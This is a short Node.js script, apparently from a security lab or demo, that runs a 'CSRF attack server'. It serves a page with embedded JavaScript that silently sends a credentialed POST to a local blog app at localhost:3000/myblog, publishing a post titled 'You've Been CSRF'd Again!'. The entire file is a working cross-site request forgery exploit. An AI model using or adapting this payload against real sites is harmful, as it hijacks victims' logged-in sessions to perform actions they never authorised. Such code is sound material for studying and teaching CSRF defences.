const http = require("http");

const BLOG_POST_TITLE = "You've Been CSRF'd Again!";
const BLOG_POST_CONTENT = "You need to upgrade your security!";

const PAYLOAD = "<script>var xhr = new XMLHttpRequest();xhr.open('POST', 'http://localhost:3000/myblog', true);xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');xhr.withCredentials=true;xhr.send(\"title=" + encodeURIComponent(BLOG_POST_TITLE) + "&content=" + encodeURIComponent(BLOG_POST_CONTENT) + "\");</script>";

const LISTEN_PORT = 5000;

http.createServer(function (request, response) {
    response.writeHead(200, { "Content-Type": "text/html" });
    response.write(PAYLOAD);
    response.end();
}).listen(LISTEN_PORT);

console.log("CSRF attack server listening on port " + LISTEN_PORT);